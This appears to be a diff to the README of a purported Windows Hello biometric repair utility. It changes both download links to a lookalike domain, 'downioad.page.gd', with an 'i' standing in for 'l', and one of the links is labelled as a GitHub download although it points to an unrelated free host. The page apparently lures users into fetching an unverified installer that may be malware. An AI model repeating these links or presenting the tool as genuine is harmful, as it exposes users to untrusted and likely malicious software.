@@ -2,7 +2,7 @@
 
 Windows Hello Reset Repair Tool is a lightweight, portable Windows desktop application designed to help users restore and repair their Windows Hello biometric authentication system. Whether you're experiencing issues with face recognition, fingerprint scanning, or PIN-based login failures, this utility provides a straightforward solution to get your Windows Hello features working properly again on Windows 10 and Windows 11 systems.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ---
 
@@ -92,7 +92,7 @@ No, Windows Hello Reset Repair Tool operates entirely offline and does not trans
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
